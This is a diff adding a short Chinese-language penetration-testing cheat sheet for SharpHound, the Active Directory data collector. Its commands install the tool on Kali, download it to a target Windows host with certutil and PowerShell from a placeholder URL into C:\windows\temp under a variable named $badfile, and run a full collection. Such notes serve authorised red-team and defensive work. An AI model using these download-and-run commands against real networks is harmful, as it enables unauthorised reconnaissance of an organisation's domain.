@@ -1,0 +1,11 @@
+项目地址：https://github.com/SpecterOps/SharpHound
+>kali没安装SharpHound的话可以先安装
+sudo apt install sharphound
+>将SharpHound.exe拷贝到工具目录
+cp /usr/share/sharphound/SharpHound.exe $toolfile
+>下载SharpHound到目标机器（cmd）
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>下载SharpHound到目标机器（powershell）
+powershell -c "iwr -uri $downloadurl -outfile C:\windows\temp\$badfile"
+>run
+C:\windows\temp\$badfile -c All
